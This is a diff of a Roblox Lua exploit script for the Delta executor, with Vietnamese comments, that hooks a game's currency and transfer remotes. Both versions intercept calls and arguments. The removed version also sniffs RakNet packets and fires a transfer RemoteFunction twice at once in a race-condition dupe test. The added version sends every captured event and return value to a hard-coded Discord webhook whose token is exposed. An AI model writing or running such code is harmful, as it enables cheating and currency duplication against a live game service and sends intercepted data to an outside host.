@@ -1,163 +1,83 @@
---[[
-    TTD GEM RECON — Delta + RakNet
-    Webhook: đã set
-]]
+-- TTD RECON — Delta
+local WEBHOOK = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1575380934860079217/70M7ZvEDzmoCA_YGtpvTc4khFp36TsZTQoLLwcOE5IfNoPEPRIXTqUORdcY8bZFgTNUf"
-local LOG_INTERVAL = 2
-local KEYWORDS = {"gem","currency","transfer","balance","coin","credit","dupe","add","remove","spend","purchase","shop","buy","sell"}
-
--- ==================== WEBHOOK ====================
-local logBuffer = {}
-local lastSend = 0
-
-local function log(msg)
-    local e = os.date("%H:%M:%S").." | "..msg
-    table.insert(logBuffer, e)
-    print("[RECON] "..e)
-end
-
-local function flush()
-    if #logBuffer==0 then return end
-    local now = tick()
-    if now-lastSend < LOG_INTERVAL then return end
-    lastSend = now
-    local c = table.concat(logBuffer,"\n")
-    if #c>1900 then c=c:sub(1,1900).."..." end
-    logBuffer = {}
+local function wh(msg)
     pcall(function()
-        local payload = '{"content":"'..c:gsub('"','\\"'):gsub("\n","\\n")..'"}'
-        if _G.http_post then
-            _G.http_post(WEBHOOK_URL, payload, {["content-type"]="application/json"})
-        else
-            game:HttpRequest and game:HttpRequest(WEBHOOK_URL,{
-                Method="POST",
-                Headers={["Content-Type"]="application/json"},
-                Body=payload
-            })
-        end
+        request({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"]="application/json"},
+            Body = string.format('{"content":"%s"}', msg:gsub('"','\\"'):gsub("\n","\\n"))
+        })
+    end, function(e)
+        print("[WH ERROR] "..tostring(e))
     end)
 end
 
-spawn(function() while true do wait(1) flush() end end)
+-- TEST NGAY
+wh("RECON loaded. Delta OK.")
+print("[RECON] Script chạy. Chờ webhook test...")
 
--- ==================== REMOTE HOOK ====================
-local function match(name)
-    local l=name:lower()
-    for _,k in ipairs(KEYWORDS) do if l:find(k) then return true end end
+wait(2)
+
+-- HOOK REMOTES
+local KW = {"gem","currency","transfer","balance","coin","credit","spend","purchase","shop","buy","sell","add","remove"}
+
+local function match(n)
+    local l = n:lower()
+    for _,k in ipairs(KW) do if l:find(k) then return true end end
     return false
 end
 
-local function hook(parent,depth)
-    depth=depth or 0
-    if depth>6 then return end
-    for _,ch in ipairs(parent:GetChildren()) do
-        if ch:IsA("RemoteEvent") and match(ch.Name) then
-            log("HOOK RE: "..ch:GetFullName())
-            ch.OnClientEvent:Connect(function(...)
-                local a={}
+local hooked = 0
+local logs = {}
+
+local function hook(p, d)
+    d = d or 0
+    if d > 6 then return end
+    for _,c in ipairs(p:GetChildren()) do
+        if c:IsA("RemoteEvent") and match(c.Name) then
+            hooked = hooked + 1
+            table.insert(logs, "RE: "..c:GetFullName())
+            c.OnClientEvent:Connect(function(...)
+                local a = {}
                 for i=1,select("#",...) do
-                    local v=select(i,...)
-                    if typeof(v)=="string" then a[i]='"'..v:sub(1,40)..'"'
-                    elseif typeof(v)=="number" then a[i]=tostring(v)
-                    elseif typeof(v)=="boolean" then a[i]=tostring(v)
-                    else a[i]=typeof(v) end
+                    local v = select(i,...)
+                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,30)..'"'
+                    elseif typeof(v)=="number" then a[#a+1]=tostring(v)
+                    else a[#a+1]=typeof(v) end
                 end
-                log("  >> ["..ch.Name.."]: "..table.concat(a,", "))
+                table.insert(logs, "  >> "..c.Name..": "..table.concat(a,", "))
+                wh("EVENT ["..c.Name.."]: "..table.concat(a,", "))
             end)
-        elseif ch:IsA("RemoteFunction") and match(ch.Name) then
-            log("HOOK RF: "..ch:GetFullName())
-            -- Wrap InvokeServer
-            local orig=ch.InvokeServer
-            ch.InvokeServer=function(self,...)
-                local a={}
+        elseif c:IsA("RemoteFunction") and match(c.Name) then
+            hooked = hooked + 1
+            table.insert(logs, "RF: "..c:GetFullName())
+            local orig = c.InvokeServer
+            c.InvokeServer = function(self, ...)
+                local a = {}
                 for i=1,select("#",...) do
-                    local v=select(i,...)
-                    if typeof(v)=="string" then a[i]='"'..v:sub(1,40)..'"'
-                    elseif typeof(v)=="number" then a[i]=tostring(v)
-                    else a[i]=typeof(v) end
+                    local v = select(i,...)
+                    if typeof(v)=="string" then a[#a+1]='"'..v:sub(1,30)..'"'
+                    elseif typeof(v)=="number" then a[#a+1]=tostring(v)
+                    else a[#a+1]=typeof(v) end
                 end
-                log("  >> CALL ["..self.Name.."]: "..table.concat(a,", "))
-                local r=orig(self,...)
-                log("  << RET ["..self.Name.."]: "..tostring(r))
+                wh("CALL ["..self.Name.."]: "..table.concat(a,", "))
+                local r = orig(self, ...)
+                wh("  RET: "..tostring(r))
                 return r
             end
         end
-        hook(ch,depth+1)
+        hook(c, d+1)
     end
 end
 
 pcall(function()
-    log("=== HOOK REMOTES ===")
-    hook(game.ReplicatedStorage,0)
-    pcall(function() hook(game.ServerStorage,0) end)
-    log("=== HOOK XONG ===")
+    hook(game.ReplicatedStorage, 0)
+end, function(e)
+    wh("HOOK ERROR: "..tostring(e))
 end)
 
--- ==================== SCAN GLOBALS ====================
-pcall(function()
-    log("=== SCAN _G ===")
-    for k,v in pairs(_G) do
-        if type(k)=="string" and match(k) then
-            log("  _G."..k.." = "..(typeof(v)=="number" and tostring(v) or typeof(v)))
-        end
-    end
-    log("=== SCAN XONG ===")
-end)
-
--- ==================== RAKNET ====================
-pcall(function()
-    if _G.raknet and _G.raknet.onPacket then
-        log("=== RAKNET HOOK ===")
-        _G.raknet.onPacket(function(pkt)
-            local s=tostring(pkt):lower()
-            for _,k in ipairs(KEYWORDS) do
-                if s:find(k) then log("  [RAKNET] "..tostring(pkt):sub(1,180) break end
-            end
-        end)
-        log("  RakNet SẴN SÀNG")
-    else
-        log("=== RAKNET: KHÔNG TÌM THẤY ===")
-    end
-end)
-
--- ==================== RACE TEST ====================
--- Tự tìm RemoteFunction có "transfer"/"gem" rồi gọi 2 lần đồng thời
-local function findTransferRF(parent,depth)
-    depth=depth or 0
-    if depth>6 then return nil end
-    for _,ch in ipairs(parent:GetChildren()) do
-        if ch:IsA("RemoteFunction") then
-            local l=ch.Name:lower()
-            if l:find("transfer") or l:find("gem") or l:find("currency") then
-                return ch
-            end
-        end
-        local r=findTransferRF(ch,depth+1)
-        if r then return r end
-    end
-    return nil
-end
-
-pcall(function()
-    local rf=findTransferRF(game.ReplicatedStorage,0)
-    if rf then
-        log("=== RACE TEST: tìm thấy "..rf.Name.." ===")
-        -- Chờ 5s cho game load xong rồi test
-        wait(5)
-        log("  Gọi 2 lần đồng thời (args placeholder, bro cần sửa args thật)")
-        spawn(function()
-            pcall(function() rf:InvokeServer(1) end)
-        end)
-        spawn(function()
-            pcall(function() rf:InvokeServer(1) end)
-        end)
-        wait(1)
-        log("  Race test XONG — xem log webhook")
-    else
-        log("=== RACE TEST: chưa tìm thấy transfer RF ===")
-        log("  Chờ hook log, xem game gọi function nào, rồi bro sửa args")
-    end
-end)
-
-log("=== SCRIPT RECON CHẠY XONG ===")
+-- GHI KẾT QUẢ
+wh("Hooked: "..hooked.." remotes. Logs:\n"..table.concat(logs, "\n"))
+print("[RECON] Hooked "..hooked.." remotes")
